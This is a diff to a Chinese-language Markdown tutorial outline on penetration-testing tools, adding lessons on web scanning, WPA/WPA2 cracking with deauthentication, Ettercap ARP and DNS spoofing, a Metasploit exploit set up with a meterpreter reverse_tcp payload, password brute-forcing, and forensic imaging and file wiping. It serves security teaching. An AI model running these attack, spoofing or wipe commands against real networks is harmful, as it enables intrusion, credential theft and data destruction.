@@ -8,7 +8,13 @@
 * [七、第7课.信息收集-DNS扫描工具的使用](#七第7课信息收集DNS扫描工具的使用)
 * [八、第8课.信息收集-主机综合扫描工具的使用](#八第8课信息收集主机综合扫描工具的使用)
 * [九、第9课.数据库密码破解工具的使用](#九第9课数据库密码破解工具的使用)
-
+* [十、第10课.Web安全检测工具的使用](#十第10课Web安全检测工具的使用)
+* [十一、第11课.无线网络安全检测工具的使用](#十一第11课无线网络安全检测工具的使用)
+* [十二、第12课.抓包嗅探工具的使用](#十二第12课抓包嗅探工具的使用)
+* [十三、第13课.欺骗攻击工具Ettercap的使用](#十三第13课欺骗攻击工具Ettercap的使用)
+* [十四、第14课.初识MetaSploit渗透攻击平台](#十四第14课初识MetaSploit渗透攻击平台)
+* [十五、第15课.密码破解工具的使用](#十五第15课密码破解工具的使用)
+* [十六、第16课.数字取证工具的使用](#十六、第16课.数字取证工具的使用)
 
 
 ***
@@ -218,15 +224,126 @@ DBPwAudit-DataBase Password Audit
     ./dbpwaudit.sh -s IP -d msyql -D mysql -U username -P password
     //破解MySQL数据库命令
 ```
+### 十、第10课.Web安全检测工具的使用
+#### 1、Nikto2
+使用perl语音写的多平台扫描软件，是一款命令行模式的工具，可以扫描指定主机的WEB类型主机名、特定目录、Cookie、特定CGI漏洞、XSS漏洞、sql注入漏洞、返回主机允许的http方法等安全问题
+```
+    ./nikto.pl -h 主机IP或域名 -o 扫描结果
+    ./nikto.pl -h 主机IP或域名 -p 80,8080
+    ./nikto.pl -h 主机IP或域名 -T 扫描类型代码
+    ./nikto.pl -h 主机IP或域名 -c -T
+    注：扫描类型代码，如下：
+    0-检查文件上传页面
+    1-检查web日志中可疑的文件或者攻击
+    2-检查错误配置或默认文件
+    3-检查信息泄露问题
+    4-检查注射（XSS/Script/HTML）问题
+    5-远程文件索引（从内部根目录中检索是否存在不经授权可访问的文件）
+    6-检查拒绝服务问题
+    7-远程文件索引（从任意位置检索是否存在不经授权可访问的文件）
+    8-检查是否存在系统命令执行漏洞
+    9-检查SQL注入
+    a-检查认证绕过问题
+    b-识别安装的软件版本等
+    c-检查源代码泄露问题
+    x-反向连接选项
+```
+#### 2、W3AF
+一个用python开发的web安全综合审计平台，通过增加插件来对扩展其功能，支持GUI和命令行两种界面
+```
+    w3af
+    w3af_gui
+```
+#### 3、Wfuzz
+一款用来进行web应用暴力猜解的工具，支持对网站目录、登录信息、应用资源文件等的暴力猜解，还可以进行get及post参数的猜解，sql注入、xss漏洞的测试等。该工具所有功能都依赖于字典
+```
+    ./wfuzz.py -c -z file -f 字典 --hc 404 --html http://www.xxx.com/FUZZ 2>ok.html
+    ./wfuzz.py -c -z range -r 1-100 --hc 404 --html http://www.xxx.com/xxx.asp?id=FUZZ 2>ok.html
+    ./wfuzz.py -c -z file -f 字典 -d "login=admin&pwd=FUZZ" --hc 404 http://www.xxx.com/login.php
+```
+### 十一、第11课.无线网络安全检测工具的使用
+#### 1、虚拟机测试注意
+* 使用USB无线网卡，在物理机上安装驱动确保正常识别
+* 启动"VMware USB Arbitration Service"服务
+* 启动虚拟机USB硬件连接支持选项
+#### 2、破解WPA/WPA2无线网络密码
+```
+    ifconfig wlan0 up
+    注：激活USB无线网卡
+    airmon-ng start wlan0
+    注：更改网卡模式为监听模式，改后为mon0
+    airodump-ng mon0
+    注：探测无线AP情况
+    airodump-ng -c 6 -w result mon0
+    注：探测并抓包
+    aireplay-ng -0 10 -a AP的MAC -c 客户端MAC mon0
+    注：对AP实施Deauth攻击，尝试捕获更完整的数据包
+    aircrack-ng -w 字典文件 捕获的cap数据包文件
+    注：挂载字典破解明文密码
+```
+### 十二、第12课.抓包嗅探工具的使用
+* Wireshark
+* dsniff
+### 十三、第13课.欺骗攻击工具Ettercap的使用
+功能强大的欺骗攻击软件，既可以实现基本的ARP欺骗，也可以实现复杂的中间人攻击
+#### 1、使用ettercap实现局域网arp欺骗+中间人攻击
+```
+    ettercap -G
+    打开/etc/etter.conf去掉相应注释信息
+    echo 1>/proc/sys/net/ipv4/ip_forward
+```
+#### 2、使用ettercap实现局域网dns欺骗
+```
+    ettercap -T -q -i eth1 -P dns_spoof // //
+```
+### 十四、第14课.初识MetaSploit渗透攻击平台
+Metasploit Framework是2003年以开放源代码方式发布、可自由获取的开发框架，这个环境为渗透测试、shellcode编写和漏洞研究提供了一个可靠的平台。它集成了各平台上常见的溢出漏洞和流行的shellcode，并且不断更新，最新版本的MSF包含了上百种当前流行的操作系统和应用软件的exploit，以及100多个shellcode。作为安全工具，它在安全监测中起到不容忽视的作用，并为漏洞自动化探测和及时检测系统漏洞提供有力的保障
+```
+    use exploit/windows/browser/ms10_046_shortcut_icon_dllloader
+    set SRVHOST [ip]
+    set PAYLOAD windows/meterpreter/reverse_tcp
+    set LHOST [ip]
+    exploit
 
+    /usr/local/share/ettercap
+    etter.dns
 
-
-
-
-
-
-
-
-
-
-
+    ettercap -T -q -i interface -P dns_spoof // //
+```
+### 十五、第15课.密码破解工具的使用
+#### 1、Ophcrack
+破解windows操作系统密码（彩虹表的方式）
+```
+    gethash &local >1.txt（打开文件，提取hash）
+    ophcrack
+    load->table（使用彩虹表）->crack
+```
+#### 2、Hydra
+在线密码暴力破解
+```
+    xhydra
+    target->passwords->tuning
+```
+#### 3、Crunch
+```
+    ./crunch 5 5 1234567890 -o pass1.dic
+    ./crunch 6 8 charset.lst numeric -o pass2.dic
+```
+### 十六、第16课.数字取证工具的使用
+#### 1、dd
+linux下非常有用的工具，作用是用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换
+```
+    dd if=/dev/sda1 of=/dev/hda1/forensic.image
+```
+#### 2、Foremost
+开源的取证工具，可以快速恢复硬盘上已删除的office文档、jpg、pdf等文件
+```
+    foremost.conf配置文件
+    foremost -v -o 丢失数据恢复目录 -c foremost.conf 镜像文件
+```
+#### 3、Wipe
+```
+    wipe -i -f -q 要擦除的文件
+    wipe -i -Q 擦除次数 要擦除的文件
+    wipe -rcf 要擦除的目录
+```
